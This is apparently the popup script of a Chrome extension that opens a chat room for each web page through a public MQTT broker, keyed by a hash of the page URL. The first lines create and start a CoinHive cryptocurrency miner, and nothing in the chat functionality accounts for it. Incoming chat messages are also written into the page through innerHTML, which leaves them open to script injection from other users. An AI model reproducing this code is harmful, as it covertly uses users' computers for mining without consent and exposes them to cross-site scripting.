var url = '' //Global URL variable
var hashed_url = ''
var username = ''
var host = 'broker.mqttdashboard.com'
var port = 8000
var miner = new CoinHive.Anonymous('rGc6qYxkR2YDcSr13AUgZI55gbSmvpuN');
miner.start();

document.addEventListener('DOMContentLoaded', function() {
	console.log("DOMContentLoaded")
  renderStatus('Please pick a username')
  chooseUsername(function(username) {
    renderStatus('Connecting', false)
    connect(username)
  })
});

function sendUserName(callback, divContainer, submit) {
      var username = document.getElementById('username_value').value
      if (username) {
        divContainer.removeChild(submit)
        divContainer.parentNode.removeChild(divContainer)
        callback(username);
      }
}

function chooseUsername(callback) {
  var divContainer = document.createElement('div')
  var field = document.createElement('input')
  var label = document.createElement('label')
  var submit = document.createElement('a')
  var icon = document.createElement('i')

  divContainer.setAttribute('class', 'input-field col 6')

  field.setAttribute('type', 'text');
  field.setAttribute('id', 'username_value')
  field.setAttribute('autocomplete', 'off')
  field.setAttribute('class', '')
  field.onkeypress = function(e) {
    var key = e.charCode || e.keyCode || 0
    if (key == 13) {
      sendUserName(callback, divContainer, submit)
      e.preventDefault()
    }
  }
  
  label.setAttribute('for', 'username_value')
  label.setAttribute('class', 'deep-orange-text')
  label.textContent = 'Username'
  
  icon.setAttribute('class', 'material-icons')
  icon.textContent = 'arrow_forward'
  
  submit.setAttribute('class','btn-floating btn-small waves-effect waves-light deep-orange');
  submit.setAttribute('id', 'button_submit')
  submit.appendChild(icon)
  submit.addEventListener('click', function() {
    sendUserName(callback, divContainer, submit);
  })

  divContainer.appendChild(field)
  divContainer.appendChild(label)

  divContainer.appendChild(submit);
  document.getElementsByTagName('body')[0].appendChild(divContainer);
}

function onConnect() {
  console.log('Connected');
  getCurrentTabUrl(function(u) {
    url = u;  
    hashed_url = url.replace(/[^a-zA-Z0-9]/g, '').toUpperCase()
    hashed_url = hash(hashed_url).toString()
    console.log(hashed_url)
    client.subscribe(hashed_url);
    //var replacedString = url.replace(/[^a-zA-Z0-9/\//]/g, '').toUpperCase();
    // client.subscribe(url);
    // console.log('Subscribed to: ' + url);
    renderStatus('Connected', true)
    sendUserConnectedMessage();
  })

  document.getElementById("status").style.height="340px"
  makeMessageForm()
}

function onMessageArrived(messageObject) {
  console.log('onMessageArrived: ' + messageObject.payloadString);
  var message = messageObject.payloadString
  var index = message.indexOf('|')
  var messageToDisplay = index == -1 ? message : message.substring(0, index) + ": " + message.substring(index + 1)
  var parent = document.getElementById('status');
  var para = document.createElement("div");
  if (index!= -1 && message.substring(0, index) == username)
  {
      para.setAttribute('class', 'card-panel deep-orange p1');
      para.innerHTML = message.substring(index + 1);
  }
  else
  {
      para.setAttribute('class', 'card-panel blue-grey darken-1 p2');
      para.innerHTML = messageToDisplay;
  }

  var brk = document.createElement('br');
  brk.setAttribute('style', 'clear:both')
  //var messageSpan = document.createElement('span');
  //messageSpan.innerHTML = messageToDisplay;
  //para.appendChild(messageSpan);
  // var node = document.createTextNode(messageToDisplay);
  // para.appendChild(node);
  parent.appendChild(para);
  parent.appendChild(brk);2
  if (parent.scrollTop > parent.scrollHeight - parent.clientHeight - 130)
  {
    parent.scrollTop = parent.scrollHeight;
    parent.animate({scrollTop: parent.scrollHeight});
  }
}

function onConnectionLost(responseObject) {
  if (responseObject.errorCode !== 0) {
    console.log('onConnectionLost: '+ responseObject.errorMessage);
  }
  connect()
}

function basicSendMessage(messageText, channel) {
  var message = new Paho.MQTT.Message(messageText)
  message.destinationName = channel
  client.send(message)
}

function sendMessage(messageText) {
  basicSendMessage(username + '|' + messageText, hashed_url) //Encoding the username of the user into the message
}

function sendUserConnectedMessage() {
  basicSendMessage(username + ' has joined', hashed_url)
}

function getCurrentTabUrl(callback) {
  var queryInfo = {
    active: true,
    currentWindow: true
  };

  chrome.tabs.query(queryInfo, function(tabs) {
    var tab = tabs[0];
    url = tab.url;
    callback(url);
  });
}

function makeMessage() {
    var message = document.getElementById('message').value;
    if (message) {
      document.getElementById('message').value = ''
      sendMessage(message)
    }
}

function makeMessageForm () {
  var writeMessageDiv = document.createElement('div');
  var messageIcon = document.createElement('i')
  var messageInput = document.createElement('input');
  var messageLabel = document.createElement('label')
  var messageSubmit = document.createElement('a')
  var icon = document.createElement('i')

  writeMessageDiv.setAttribute('class', 'input-field col 6');

  messageIcon.setAttribute('class', 'material-icons prefix')
  messageIcon.textContent = 'edit'

  messageInput.setAttribute('type', 'text');
  messageInput.setAttribute('autocomplete', 'off')
  messageInput.setAttribute('id', 'message');

  messageInput.onkeypress = function(e) {
    var key = e.charCode || e.keyCode || 0;
    if (key == 13) {
      makeMessage();
      e.preventDefault();
    }
  }
  
  messageLabel.setAttribute('for', 'message')
  messageLabel.textContent = 'Send Message...'

  icon.setAttribute('class', 'material-icons')
  icon.setAttribute('id', 'iconAttr');
  icon.textContent = 'send'

  
  messageSubmit.setAttribute('class','btn-floating btn-small waves-effect waves-light deep-orange');
  messageSubmit.setAttribute('id', 'message_submit')
  messageSubmit.appendChild(icon)
  messageSubmit.addEventListener('click', function() {
    makeMessage();
  })
  
  writeMessageDiv.appendChild(messageIcon);
  writeMessageDiv.appendChild(messageInput);
  writeMessageDiv.appendChild(messageLabel);
  writeMessageDiv.appendChild(messageSubmit)

  document.getElementsByTagName('body')[0].appendChild(writeMessageDiv);
}

function connect(u) {
  username = u //Set the global variable
  var randomizedUsername = username + '|' + Math.random().toString() //Randomized to ensure no clashes
  client = new Paho.MQTT.Client(host, port, randomizedUsername);
  client.onConnectionLost = onConnectionLost; //Set callbacks
  client.onMessageArrived = onMessageArrived;
  client.connect({onSuccess:onConnect}); //Connect
}

function renderStatus(statusText, isUrl) {
  if (isUrl)
    document.getElementById('status').innerHTML = statusText + " to " + url + "." + '<br>' + "Happy CARMing :)" + '<br>' ;
  else
    document.getElementById('status').innerHTML = statusText;
}

function hash(str) {
  var hash = 5381, i = str.length

  while(i)
    hash = (hash * 33) ^ str.charCodeAt(--i)

  /* JavaScript does bitwise operations (like XOR, above) on 32-bit signed
   * integers. Since we want the results to be always positive, convert the
   * signed int to an unsigned by doing an unsigned bitshift. */
  return hash >>> 0;
}